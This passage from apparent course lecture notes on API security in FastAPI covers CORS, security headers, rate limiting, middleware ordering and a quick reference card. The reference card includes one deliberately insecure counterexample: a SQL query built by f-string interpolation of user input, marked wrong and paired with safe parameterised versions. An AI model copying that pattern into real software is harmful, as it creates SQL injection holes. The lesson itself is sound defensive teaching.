│  □ Password reset rate limited (2/minute)                       │
│  □ Rate limit headers sent to clients                           │
│                                                                 │
│  OPERATIONAL                                                    │
│  □ Debug mode OFF in production (no stack traces to users)      │
│  □ No secrets in code or git (use env vars)                     │
│  □ Dependencies updated (no known CVEs)                         │
│  □ API versioned and documented                                 │
│  □ Errors don't reveal internal details                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Putting It All Together — The Full Middleware Stack

**Here's what your `main.py` security setup looks like after this lecture:**

```python
"""
main.py — Application entry point with full security configuration.

Middleware in FastAPI/Starlette is processed in REVERSE order of addition.
The LAST middleware added is the OUTERMOST (first to process a request,
last to process the response).

Request flow:  CORS → SecurityHeaders → SlowAPI → Route Handler
Response flow: Route Handler → SlowAPI → SecurityHeaders → CORS
"""

import os

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.errors import RateLimitExceeded
from slowapi.middleware import SlowAPIMiddleware
from slowapi.util import get_remote_address
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import JSONResponse, Response


# ─── Security Headers Middleware ────────────────────────────────

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next) -> Response:
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Content-Security-Policy"] = (
            "default-src 'none'; frame-ancestors 'none'"
        )
        response.headers["X-XSS-Protection"] = "0"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = (
            "geolocation=(), camera=(), microphone=()"
        )
        return response


# ─── Rate Limiter Setup ────────────────────────────────────────

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["60/minute"],  # Default for all endpoints
    headers_enabled=True,           # Send X-RateLimit headers
)


# ─── Custom Rate Limit Response ────────────────────────────────

async def rate_limit_handler(
    request: Request, exc: RateLimitExceeded,
) -> JSONResponse:
    return JSONResponse(
        status_code=429,
        content={
            "error": "rate_limit_exceeded",
            "message": "Too many requests. Please slow down.",
            "retry_after": exc.detail,
        },
        headers={"Retry-After": str(exc.detail)},
    )


# ─── CORS Configuration ───────────────────────────────────────

ENVIRONMENT = os.getenv("ENVIRONMENT", "development")

CORS_ORIGINS = {
    "development": [
        "http://localhost:3000",
        "http://localhost:5173",
    ],
    "production": [
        "https://myapp.com",
        "https://admin.myapp.com",
    ],
}


# ─── App Assembly ──────────────────────────────────────────────

app = FastAPI(
    title="Task Manager API",
    # In production: don't expose docs publicly
    # docs_url=None if ENVIRONMENT == "production" else "/docs",
    # redoc_url=None if ENVIRONMENT == "production" else "/redoc",
)

# Rate limiter state + exception handler
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, rate_limit_handler)

# Middleware stack (remember: LAST added = OUTERMOST)
# 1. SlowAPI — innermost (closest to route handlers)
app.add_middleware(SlowAPIMiddleware)

# 2. Security Headers — middle (adds headers to ALL responses,
#    including 429 from rate limiter)
app.add_middleware(SecurityHeadersMiddleware)

# 3. CORS — outermost (handles OPTIONS preflight BEFORE
#    rate limiter or anything else processes the request)
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS.get(ENVIRONMENT, []),
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=600,
)

# Include your routers...
# app.include_router(auth_router)
# app.include_router(tasks_router)
# app.include_router(users_router)
```

**Why the ordering matters:**

```
┌─────────────────────────────────────────────────────────────────┐
│                MIDDLEWARE ORDER MATTERS                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CORS must be OUTERMOST because:                                │
│  → Browser sends OPTIONS preflight BEFORE the real request.     │
│  → If rate limiter runs first, it might reject the OPTIONS      │
│    request and the browser never sends the real one.            │
│                                                                 │
│  SecurityHeaders should wrap SlowAPI because:                   │
│  → When SlowAPI returns a 429 response, it still needs          │
│    security headers. If SecurityHeaders were INNER to           │
│    SlowAPI, the 429 would skip it.                              │
│                                                                 │
│  SlowAPI is INNERMOST because:                                  │
│  → It only needs to check rate limits for actual requests       │
│    (not CORS preflight, not error responses).                   │
│                                                                 │
│  REQUEST:  CORS → SecurityHeaders → SlowAPI → Route             │
│  RESPONSE: Route → SlowAPI → SecurityHeaders → CORS             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│                API SECURITY QUICK REFERENCE                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CORS:                                                          │
│    from fastapi.middleware.cors import CORSMiddleware            │
│    app.add_middleware(CORSMiddleware,                            │
│        allow_origins=["https://myapp.com"],                     │
│        allow_credentials=True,                                  │
│        allow_methods=["GET","POST","PUT","PATCH","DELETE"],      │
│        allow_headers=["Authorization","Content-Type"],          │
│    )                                                            │
│                                                                 │
│  SQL INJECTION PREVENTION:                                      │
│    ❌ text(f"SELECT * FROM t WHERE x = '{val}'")                │
│    ✅ text("SELECT * FROM t WHERE x = :val"), {"val": val}      │
│    ✅ select(Model).where(Model.x == val)                       │
│                                                                 │
│  INPUT VALIDATION:                                              │
│    str = Field(max_length=200)  ← ALWAYS set max_length         │
│    int = Field(ge=1, le=100)    ← ALWAYS set bounds             │
│    Separate Create / Update / Response models                   │
│                                                                 │
│  RATE LIMITING:                                                 │
│    from slowapi import Limiter                                  │
│    limiter = Limiter(key_func=get_remote_address)               │
│    @limiter.limit("5/minute")                                   │
│    async def login(request: Request, ...):                      │
│    # Remember: request parameter is REQUIRED                    │
│                                                                 │
│  SECURITY HEADERS:                                              │
│    X-Content-Type-Options: nosniff                               │
│    X-Frame-Options: DENY                                        │
│    Content-Security-Policy: default-src 'none'                  │
│    Strict-Transport-Security: max-age=31536000 (HTTPS only)     │
│    Cache-Control: no-store (sensitive endpoints)                 │
│                                                                 │
│  KEY PRINCIPLES:                                                │
│    • CORS protects USERS (browsers), not your server            │
│    • Never build SQL with string formatting from user input     │
│    • Every input field needs bounds (length, range)             │
│    • Auth endpoints need strict rate limits                     │
│    • Return 404 (not 403) for resources user can't access       │
│    • Security headers go on EVERY response via middleware       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# Summary: The Key Mental Model

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  SECURITY = DEFENSE IN DEPTH                                    │
│                                                                 │
│  No single layer is enough. Every layer catches what the        │
│  previous layer missed. Every layer slows the attacker down.    │
│                                                                 │
│  ┌──────────┐                                                   │
│  │   CORS   │ → Who can talk to us from a browser?              │
│  ├──────────┤                                                   │
│  │ HEADERS  │ → What rules must the browser follow?             │
│  ├──────────┤                                                   │
│  │  RATE    │ → How often can you try?                          │
│  │  LIMIT   │                                                   │
│  ├──────────┤                                                   │
│  │  INPUT   │ → Is your data sane and safe?                     │
│  │VALIDATION│                                                   │
│  ├──────────┤                                                   │
│  │  AUTH    │ → Who are you? (JWT)                               │
│  ├──────────┤                                                   │
│  │  AUTHZ   │ → What can you do? (RBAC + BOLA checks)           │
│  ├──────────┤                                                   │
│  │ QUERIES  │ → Is the database command safe? (ORM/params)      │
│  └──────────┘                                                   │
│                                                                 │
│  THE BANK ANALOGY:                                              │
│  ├─ CORS         = Partner institution guest list               │
│  ├─ Headers      = Building codes and regulations               │
│  ├─ Rate Limit   = Vault lockout after failed attempts          │
│  ├─ Validation   = Teller checking every form field             │
│  ├─ Auth         = Checking your ID at the counter              │
│  ├─ Authorization = Verifying you're allowed this transaction   │
│  └─ Param. Query = Teller reads forms as DATA, not COMMANDS     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# Connection to Upcoming Lectures

```
┌─────────────────────────────────────────────────────────────────┐
│                    WHERE THIS LEADS                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  THIS WEEK'S PROJECT:                                           │
│  └─ Add Auth to Task Manager / Integration Service              │
│     You'll configure CORS, rate limit login,                    │
│     add security headers — everything from today.               │
│                                                                 │
│  WEEK 10 (Redis):                                               │
│  └─ Distributed rate limiting with Redis                        │
│     Today's in-memory rate limiting works for one server.       │
│     Redis makes it work across multiple server instances.       │
│     Also: storing refresh tokens in Redis for fast revocation.  │
│                                                                 │
│  WEEK 12 (Performance):                                         │
│  └─ slowapi deep-dive with advanced key functions,              │
│     per-user rate limits (now that users are authenticated),    │
│     and rate limit headers in load testing.                     │
│                                                                 │
│  WEEK 15 (Deployment):                                          │
│  └─ Secrets management (no passwords in code)                   │
│     HTTPS configuration with Strict-Transport-Security          │
│     Production security checklist before going live             │
│     Sentry for error tracking (security event monitoring)       │
│                                                                 │
│  WEEK 16 (System Design):                                       │
│  └─ API gateway pattern (centralized auth + rate limiting)      │
│     Designing for failure (what if Redis goes down?)            │
│     WAF (Web Application Firewall) awareness                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```